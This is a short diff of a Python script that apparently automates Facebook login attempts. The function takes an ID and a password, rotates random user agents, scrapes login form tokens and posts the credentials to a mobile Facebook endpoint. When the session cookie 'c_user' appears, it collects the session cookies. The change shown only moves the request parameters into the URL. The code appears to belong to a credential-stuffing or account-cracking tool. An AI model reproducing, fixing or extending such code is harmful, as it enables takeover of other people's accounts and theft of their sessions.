@@ -1212,10 +1212,6 @@ def m6(idf,pwv):
    referer_url = f'https://www.facebook.com/login/web/?email={idf}&is_from_lara=1'
    pro = random.choice(ugen)
    free_fb = session.get(referer_url).text
-   params = {
-   'flow': 'initiate_view',
-   'ls': 'initiate_view',
-   'c': f'https://mbasic.facebook.com/login/?email={idf}&li=x-XKZs2ocnd6TEeq6PC-lIUz&e=1348092&shbl=1&refsrc=deprecated',}
    log_data = {
    'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1246,7 +1242,7 @@ def m6(idf,pwv):
     'upgrade-insecure-requests': '1',
     'user-agent': pro,
     'viewport-width': '885',}
-   lo = session.post('https://mbasic.facebook.com/login/account_recovery/name_search/',params=params,headers=header_freefb,data=log_data).text
+   lo = session.post(f'https://mbasic.facebook.com/login/account_recovery/name_search/?flow=initiate_view&ls=initiate_view&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Femail%3D{idf}%26li%3Dx-XKZs2ocnd6TEeq6PC-lIUz%26e%3D1348092%26shbl%3D1%26refsrc%3Ddeprecated',headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
